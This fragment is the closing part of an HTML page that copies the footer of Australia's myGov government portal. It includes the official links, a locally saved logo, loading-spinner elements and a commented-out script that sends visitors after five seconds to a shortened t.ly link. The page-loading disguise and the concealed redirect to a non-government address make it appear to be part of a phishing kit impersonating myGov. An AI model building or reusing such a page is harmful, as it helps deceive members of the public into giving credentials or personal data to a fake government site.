<footer role="contentinfo">
    <div class="wrapper">
      <div class="inner">
        <section class="footer-list">
          <nav>
            <h2 class="sr-only">Footer</h2>
            <ul class="lower-links">
              <li>
                <a href="https://my.gov.au/en/about/terms">Terms of use</a>
              </li>
              <li>
                <a href="https://my.gov.au/en/about/privacy-and-security">Privacy and security</a>
              </li>
              <li>
                <a href="https://my.gov.au/en/about/copyright">Copyright</a>
              </li>
              <li>
                <a href="https://my.gov.au/en/about/accessibility">Accessibility</a>
              </li>
            </ul>
          </nav>
        </section>

        <div class="footer-lower">
          <section class="footer-lower-logo">
            <a href="https://beta.my.gov.au/">
              <img src="loadGOV_files/logo-light.svg" width="313.17" height="70" role="img">
            </a>
            <div class="spin"></div>
          </section>

          <p class="footer-acknowledgement">We acknowledge the 
Traditional Custodians of the lands we live on. We pay our respects to 
all Elders, past and present, of all Aboriginal and Torres Strait 
Islander nations.</p>
<div class="loader"></div>

        </div>
      </div>
    </div>
  </footer>

//  <script>
//    setTimeout(() => {
//      window.location.href = 'https://t.ly/Er0uv';
//    }, 5000)
//  </script>



</body></html>